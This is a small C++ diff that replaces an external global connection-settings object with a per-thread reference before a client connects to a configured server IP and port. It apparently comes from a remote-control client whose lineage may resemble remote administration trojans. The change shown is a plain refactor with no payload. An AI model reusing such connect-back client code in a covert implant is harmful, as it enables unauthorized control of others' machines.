@@ -14,8 +14,6 @@
 
 #include "KernelManager.h" 
 
-extern CONNECT_ADDRESS g_SETTINGS;
-
 DWORD WINAPI ThreadProc(LPVOID lParam)
 {
 	THREAD_ARG_LIST	ThreadArgList = {0};
@@ -30,6 +28,7 @@ template <class Manager, int n> DWORD WINAPI LoopManager(LPVOID lParam)
 {
 	ThreadInfo *pInfo = (ThreadInfo *)lParam;
 	IOCPClient	*ClientObject = pInfo->p;
+	CONNECT_ADDRESS& g_SETTINGS(*(pInfo->conn));
 	if (ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort()))
 	{
 		Manager	m(ClientObject, n, pInfo->user);
